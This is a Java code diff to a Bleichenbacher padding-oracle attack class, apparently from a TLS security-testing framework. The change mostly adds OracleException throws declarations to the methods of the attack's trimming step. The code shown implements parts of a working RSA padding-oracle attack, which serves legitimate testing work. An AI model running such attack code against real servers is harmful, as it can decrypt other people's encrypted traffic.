@@ -5,6 +5,7 @@
 package de.rub.nds.ssl.stack.tests.attacks.bleichenbacher;
 
 import de.rub.nds.ssl.stack.Utility;
+import de.rub.nds.ssl.stack.tests.attacks.bleichenbacher.exceptions.OracleException;
 import de.rub.nds.ssl.stack.tests.attacks.bleichenbacher.oracles.AOracle;
 import java.math.BigInteger;
 import java.util.LinkedList;
@@ -39,7 +40,7 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
     }
 
     @Override
-    protected void stepOneB() {
+    protected void stepOneB() throws OracleException {
         System.out.println("Step 1b: Trimming");
 
         tList = findtList();
@@ -64,7 +65,7 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
         System.out.println("IntervalMax: \n" + Utility.bytesToHex(intervalMax.toByteArray()));
     }
 
-    protected List<BigInteger> findtList() {
+    protected List<BigInteger> findtList() throws OracleException {
         BigInteger t = BigInteger.valueOf(4);
 
         while (t.compareTo(BigInteger.valueOf(maxtUsed)) <= 0) {
@@ -90,7 +91,7 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
      * @param lcm
      * @return
      */
-    private BigInteger findMinU(BigInteger lcm) {
+    private BigInteger findMinU(BigInteger lcm) throws OracleException {
         BigInteger minU = lcm.multiply(BigInteger.valueOf(2)).divide(BigInteger.valueOf(3));
         while (true) {
             if (isDivisible(lcm, minU)) {
@@ -106,7 +107,7 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
      * @param lcm
      * @return
      */
-    private BigInteger findMaxU(BigInteger lcm) {
+    private BigInteger findMaxU(BigInteger lcm) throws OracleException {
         BigInteger maxU = lcm.multiply(BigInteger.valueOf(3)).divide(BigInteger.valueOf(2));
         while (true) {
             if (isDivisible(lcm, maxU)) {
@@ -116,7 +117,7 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
         }
     }
 
-    private boolean isDivisible(BigInteger t, BigInteger u) {
+    private boolean isDivisible(BigInteger t, BigInteger u) throws OracleException {
         BigInteger c = divideAndMultiply(t, u, c0);
 
         byte[] msg = Utility.correctSize(c.toByteArray(), blockSize, true);
@@ -153,7 +154,8 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
         return c;
     }
 
-    private boolean isDivisible(BigInteger t, List<BigInteger> uList) {
+    private boolean isDivisible(BigInteger t, List<BigInteger> uList) throws
+            OracleException {
         for (BigInteger u : uList) {
             if (isDivisible(t, u)) {
                 return true;
